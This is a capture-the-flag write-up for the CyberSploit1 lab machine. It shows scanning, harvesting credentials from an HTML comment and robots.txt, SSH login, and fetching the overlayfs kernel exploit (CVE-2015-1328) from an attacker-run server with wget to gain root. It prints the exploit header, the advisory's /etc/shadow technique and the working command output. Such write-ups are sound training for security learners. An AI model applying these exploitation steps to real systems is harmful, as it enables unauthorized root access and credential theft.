# CyberSploit1

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Difficulty: Easy
Community Rating: Easy
OS: Linux
Points: 5
Description:
Utilize enumeration and web enumeration techniques to identify vulnerabilities. Engage in privilege 
escalation strategies and leverage kernel exploitation methods to enhance your access. This lab is 
designed to capitalize on your skills in vulnerability exploitation.
Released: 6 Oct 2020
```

## Solution

### Scan for services with nmap

We start by scanning the machine with `nmap`

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
└─$ nmap -v -sV -sC 192.168.198.92
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 12:46 CEST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:46
Completed NSE at 12:46, 0.00s elapsed
Initiating NSE at 12:46
Completed NSE at 12:46, 0.00s elapsed
Initiating NSE at 12:46
Completed NSE at 12:46, 0.00s elapsed
Initiating Ping Scan at 12:46
Scanning 192.168.198.92 [2 ports]
Completed Ping Scan at 12:46, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:46
Completed Parallel DNS resolution of 1 host. at 12:46, 0.00s elapsed
Initiating Connect Scan at 12:46
Scanning 192.168.198.92 [1000 ports]
Discovered open port 80/tcp on 192.168.198.92
Discovered open port 22/tcp on 192.168.198.92
Completed Connect Scan at 12:46, 0.51s elapsed (1000 total ports)
Initiating Service scan at 12:46
Scanning 2 services on 192.168.198.92
Completed Service scan at 12:47, 6.08s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.198.92.
Initiating NSE at 12:47
Completed NSE at 12:47, 1.06s elapsed
Initiating NSE at 12:47
Completed NSE at 12:47, 0.12s elapsed
Initiating NSE at 12:47
Completed NSE at 12:47, 0.00s elapsed
Nmap scan report for 192.168.198.92
Host is up (0.031s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 01:1b:c8:fe:18:71:28:60:84:6a:9f:30:35:11:66:3d (DSA)
|   2048 d9:53:14:a3:7f:99:51:40:3f:49:ef:ef:7f:8b:35:de (RSA)
|_  256 ef:43:5b:d0:c0:eb:ee:3e:76:61:5c:6d:ce:15:fe:7e (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Hello Pentester!
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 12:47
Completed NSE at 12:47, 0.00s elapsed
Initiating NSE at 12:47
Completed NSE at 12:47, 0.00s elapsed
Initiating NSE at 12:47
Completed NSE at 12:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
```

We have two services running:

- OpenSSH 5.9p1 on port 22
- Apache httpd v2.2.22 on port 80

### Check the web site

Browsing manually to port 80 and checking the source of the homepage gives us a username in a comment

```text
<!-------------username:itsskv--------------------->
```

We can also run all HTTP-related enumeration scripts in nmap

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
└─$ nmap -v -p80 --script "http-enum*" 192.168.198.92
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 12:48 CEST
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
Initiating Ping Scan at 12:48
Scanning 192.168.198.92 [2 ports]
Completed Ping Scan at 12:48, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:48
Completed Parallel DNS resolution of 1 host. at 12:48, 0.00s elapsed
Initiating Connect Scan at 12:48
Scanning 192.168.198.92 [1 port]
Discovered open port 80/tcp on 192.168.198.92
Completed Connect Scan at 12:48, 0.03s elapsed (1 total ports)
NSE: Script scanning 192.168.198.92.
Initiating NSE at 12:48
Completed NSE at 12:48, 3.11s elapsed
Nmap scan report for 192.168.198.92
Host is up (0.030s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /robots.txt: Robots file

NSE: Script Post-scanning.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.33 seconds
```

Let's check the contents of the [robots.txt](https://en.wikipedia.org/wiki/Robots.txt) file

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
└─$ curl http://192.168.198.92/robots.txt
Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=

┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
└─$ curl -s http://192.168.198.92/robots.txt | base64 -d
cybersploit{youtube.com/c/cybersploit}
```

The base64-encoded looks very much like a flag, but it wasn't (at least not any more).  
Could it be the password for the `itsskv` user? Let's try it!

### Login as itsskv via SSH

We try our flag-like password and it works

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
└─$ ssh itsskv@192.168.198.92                                                
The authenticity of host '192.168.198.92 (192.168.198.92)' can't be established.
ECDSA key fingerprint is SHA256:19IzxsJJ/ZH00ix+vmS6+HQqDcXtk9k30aT3K643kSs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.198.92' (ECDSA) to the list of known hosts.
itsskv@192.168.198.92's password: 
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Your Hardware Enablement Stack (HWE) is supported until April 2017.

itsskv@cybersploit-CTF:~$ 
```

### Get the user flag

Now we can start looking for the user flag

```bash
itsskv@cybersploit-CTF:~$ ls -la
total 156
drwxr-xr-x 20 itsskv itsskv  4096 Sep  4  2020 .
drwxr-xr-x  4 root   root    4096 Jun 25  2020 ..
-rw-------  1 itsskv itsskv     0 Sep  4  2020 .bash_history
-rw-r--r--  1 itsskv itsskv   220 Jun 25  2020 .bash_logout
-rw-r--r--  1 itsskv itsskv  3486 Jun 25  2020 .bashrc
drwx------ 14 itsskv itsskv  4096 Jun 25  2020 .cache
drwx------  9 itsskv itsskv  4096 Jun 25  2020 .config
drwx------  3 itsskv itsskv  4096 Jun 25  2020 .dbus
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25  2020 Desktop
-rw-r--r--  1 itsskv itsskv    25 Jun 26  2020 .dmrc
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25  2020 Documents
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25  2020 Downloads
-rw-r--r--  1 itsskv itsskv  8445 Jun 25  2020 examples.desktop
-rw-rw-r--  1 itsskv itsskv    32 Sep  3  2020 flag2.txt
drwx------  3 itsskv itsskv  4096 Jun 26  2020 .gconf
drwx------  4 itsskv itsskv  4096 Jun 25  2020 .gnome2
-rw-rw-r--  1 itsskv itsskv   142 Jun 26  2020 .gtk-bookmarks
drwx------  2 itsskv itsskv  4096 Jun 25  2020 .gvfs
-rw-------  1 itsskv itsskv  1062 Jun 26  2020 .ICEauthority
drwxr-xr-x  3 itsskv itsskv  4096 Jun 25  2020 .local
-rw-r--r--  1 itsskv itsskv    33 Sep 13 16:15 local.txt
drwx------  3 itsskv itsskv  4096 Jun 25  2020 .mission-control
drwx------  4 itsskv itsskv  4096 Jun 25  2020 .mozilla
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25  2020 Music
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25  2020 Pictures
-rw-r--r--  1 itsskv itsskv   675 Jun 25  2020 .profile
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25  2020 Public
drwx------  2 itsskv itsskv  4096 Jun 26  2020 .pulse
-rw-------  1 itsskv itsskv   256 Jun 25  2020 .pulse-cookie
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25  2020 Templates
drwxr-xr-x  2 itsskv itsskv  4096 Jun 25  2020 Videos
-rw-------  1 itsskv itsskv     0 Jun 26  2020 .Xauthority
-rw-------  1 itsskv itsskv 12288 Jun 26  2020 .xsession-errors
-rw-------  1 itsskv itsskv 13525 Jun 26  2020 .xsession-errors.old
itsskv@cybersploit-CTF:~$ cat flag2.txt
Your flag is in another file...
itsskv@cybersploit-CTF:~$ cat local.txt
e<REDACTED>0
itsskv@cybersploit-CTF:~$ 
```

Nice, so far so good.

### Enumeration for privesc

Next, we enumerate the system for privilege escalation opportunities.

After some enumeration the kernel version was identified as an old one

```bash
itsskv@cybersploit-CTF:~$ uname -a
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 athlon i386 GNU/Linux
```

Perhaps there is an local privesc exploit available?

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
└─$ searchsploit linux 3.13.0 local privilege
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Exim < 4.86.2 - Local Privilege Escalation                                                                                                              | linux/local/39549.txt
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                                                                               | solaris/local/15962.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                                                                                       | linux/local/50135.c
Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Escalation                                                              | linux/local/41995.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                                    | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)                               | linux/local/37293.txt
Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation                                                          | linux_x86-64/local/33516.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation (3)                                                  | linux_x86-64/local/31347.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                                                              | linux/local/41886.c
Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation                                                                                       | linux/local/34923.c
Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation                                                                            | linux_x86-64/local/44302.c
Linux kernel < 4.10.15 - Race Condition Privilege Escalation                                                                                            | linux/local/43345.c
Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation                                                                       | linux/local/45553.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                           | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                  | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                                       | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                   | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)                               | linux/local/47169.c
Nagios < 4.2.4 - Local Privilege Escalation                                                                                                             | linux/local/40921.sh
NfSen < 1.3.7 / AlienVault OSSIM < 5.3.6 - Local Privilege Escalation                                                                                   | linux/local/42305.txt
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                                    | linux/local/40962.txt
Oracle VM VirtualBox < 5.0.32 / < 5.1.14 - Local Privilege Escalation                                                                                   | linux/local/41196.txt
Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (1)                                                                                             | linux/local/47009.c
systemd (systemd-tmpfiles) < 236 - 'fs.protected_hardlinks=0' Local Privilege Escalation                                                                | linux/local/43935.txt
Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                                                  | linux/local/41760.txt
UCOPIA Wireless Appliance < 5.1.8 - Local Privilege Escalation                                                                                          | linux/local/42936.md
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
└─$ searchsploit -m 37292                    
  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
    Codes: CVE-2015-1328
 Verified: True
File Type: C source, ASCII text, with very long lines (466)
Copied to: /mnt/hgfs/Wargames/OffSec_PG/PG_Play/CyberSploit1/37292.c


┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
└─$ searchsploit -m 37293
  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)
      URL: https://www.exploit-db.com/exploits/37293
     Path: /usr/share/exploitdb/exploits/linux/local/37293.txt
    Codes: CVE-2015-1328, OSVDB-123362
 Verified: True
File Type: ASCII text
Copied to: /mnt/hgfs/Wargames/OffSec_PG/PG_Play/CyberSploit1/37293.txt
```

There are two possible overlayfs-related ones for the specific kernel versions.  
Let's examine them more closely.

### Examine the possible exploits

First the C source code one

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
└─$ head -50 37292.c
/*
# Exploit Title: ofs.c - overlayfs local root in ubuntu
# Date: 2015-06-15
# Exploit Author: rebel
# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
CVE-2015-1328 / ofs.c
overlayfs incorrect permission handling + FS_USERNS_MOUNT

user@ubuntu-server-1504:~$ uname -a
Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
user@ubuntu-server-1504:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
user@ubuntu-server-1504:~$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)

greets to beist & kaliman
2015-05-24
%rebel%
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
```

This one looks interesting...

Now for the text instruction one

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
└─$ cat 37293.txt   
The overlayfs filesystem does not correctly check file permissions when
creating new files in the upper filesystem directory. This can be exploited
by an unprivileged process in kernels with CONFIG_USER_NS=y and where
overlayfs has the FS_USERNS_MOUNT flag, which allows the mounting of overlayfs
inside unprivileged mount namespaces. This is the default configuration of
Ubuntu 12.04, 14.04, 14.10, and 15.04 [1].

If you don't want to update your kernel and you don't use overlayfs, a viable
workaround is to just remove or blacklist overlayfs.ko / overlay.ko.

Details
================================

>From Documentation/filesystems/overlayfs.txt [2]:

"Objects that are not directories (files, symlinks, device-special
files etc.) are presented either from the upper or lower filesystem as
appropriate.  When a file in the lower filesystem is accessed in a way
the requires write-access, such as opening for write access, changing
some metadata etc., the file is first copied from the lower filesystem
to the upper filesystem (copy_up)."

The ovl_copy_up_* functions do not correctly check that the user has
permission to write files to the upperdir directory. The only permissions
that are checked is if the owner of the file that is being modified has
permission to write to the upperdir. Furthermore, when a file is copied from
the lowerdir the file metadata is carbon copied, instead of attributes such as
owner being changed to the user that triggered the copy_up_* procedures.

Example of creating a 1:1 copy of a root-owned file:

(Note that the workdir= option is not needed on older kernels)

user@...ntu-server-1504:~$ ./create-namespace
root@...ntu-server-1504:~# mount -t overlay -o
lowerdir=/etc,upperdir=upper,workdir=work overlayfs o
root@...ntu-server-1504:~# chmod 777 work/work/
root@...ntu-server-1504:~# cd o
root@...ntu-server-1504:~/o# mv shadow copy_of_shadow
(exit the namespace)
user@...ntu-server-1504:~$ ls -al upper/copy_of_shadow
-rw-r----- 1 root shadow 1236 May 24 15:51 upper/copy_of_shadow
user@...ntu-server-1504:~$ stat upper/copy_of_shadow /etc/shadow|grep Inode
Device: 801h/2049d      Inode: 939791      Links: 1
Device: 801h/2049d      Inode: 277668      Links: 1

Now we can place this file in /etc by switching "upper" to be the lowerdir
option, the permission checks pass since the file is owned by root and root
can write to /etc.

user@...ntu-server-1504:~$ ./create-namespace
root@...ntu-server-1504:~# mount -t overlay -o
lowerdir=upper,upperdir=/etc,workdir=work overlayfs o
root@...ntu-server-1504:~# chmod 777 work/work/
root@...ntu-server-1504:~# cd o
root@...ntu-server-1504:~/o# chmod 777 copy_of_shadow
root@...ntu-server-1504:~/o# exit
user@...ntu-server-1504:~$ ls -al /etc/copy_of_shadow
-rwxrwxrwx 1 root shadow 1236 May 24 15:51 /etc/copy_of_shadow

The attached exploit gives a root shell by creating a world-writable
/etc/ld.so.preload file. The exploit has been tested on the most recent
kernels before 2015-06-15 on Ubuntu 12.04, 14.04, 14.10 and 15.04.

It is also possible to list directory contents for any directory on the system
regardless of permissions:

nobody@...ntu-server-1504:~$ ls -al /root
ls: cannot open directory /root: Permission denied
nobody@...ntu-server-1504:~$ mkdir o upper work
nobody@...ntu-server-1504:~$ mount -t overlayfs -o
lowerdir=/root,upperdir=/home/user/upper,workdir=/home/user/work
overlayfs /home/user/o
nobody@...ntu-server-1504:~$ ls -al o 2>/dev/null
total 8
drwxrwxr-x 1 root nogroup 4096 May 24 16:33 .
drwxr-xr-x 8 root nogroup 4096 May 24 16:33 ..
-????????? ? ?    ?          ?            ? .bash_history
-????????? ? ?    ?          ?            ? .bashrc
d????????? ? ?    ?          ?            ? .cache
-????????? ? ?    ?          ?            ? .lesshst
d????????? ? ?    ?          ?            ? linux-3.19.0


Credit
================================
Philip Pettersson, Samsung SDS Security Center

References
================================
[1] https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/vivid/commit/?id=78ec4549
[2] https://www.kernel.org/doc/Documentation/filesystems/overlayfs.txt
[3] http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html



## EDB Note: Exploit Mirror - https://www.exploit-db.com/exploits/37292  
```

The first one seems more direct.  
Let's transfer it and compile it.

### Transfer the exploit and compile it

We share the exploit via HTTP

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
└─$ python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

And download it to the cybersploit-machine with `wget`

```bash
itsskv@cybersploit-CTF:~$ cd /tmp
itsskv@cybersploit-CTF:/tmp$ which wget
/usr/bin/wget
itsskv@cybersploit-CTF:/tmp$ wget http://192.168.45.154:8000/37292.c
--2024-09-13 16:58:27--  http://192.168.45.154:8000/37292.c
Connecting to 192.168.45.154:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: `37292.c'

100%[================================================================================================================================================>] 4,968       --.-K/s   in 0s      

2024-09-13 16:58:27 (22.6 MB/s) - `37292.c' saved [4968/4968]
```

Then we compile and run the exploit

```bash
itsskv@cybersploit-CTF:/tmp$ gcc 37292.c -o ofs
itsskv@cybersploit-CTF:/tmp$ chmod +x ofs 
itsskv@cybersploit-CTF:/tmp$ ./ofs 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
#   
```

Excellent, we are root!

### Get the root flag

Finally we get the root flag

```bash
# cd /root
# ls    
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  finalflag.txt  proof.txt
# cat proof.txt 
c<REDACTED>d
# 
```

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [base64 - Linux manual page](https://man7.org/linux/man-pages/man1/base64.1.html)
- [Base64 - Wikipedia](https://en.wikipedia.org/wiki/Base64)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [OpenSSH  - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [robots.txt - Wikipedia](https://en.wikipedia.org/wiki/Robots.txt)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [uname - Linux manual page](https://man7.org/linux/man-pages/man1/uname.1.html)
- [wget - Linux manual page](https://man7.org/linux/man-pages/man1/wget.1.html)
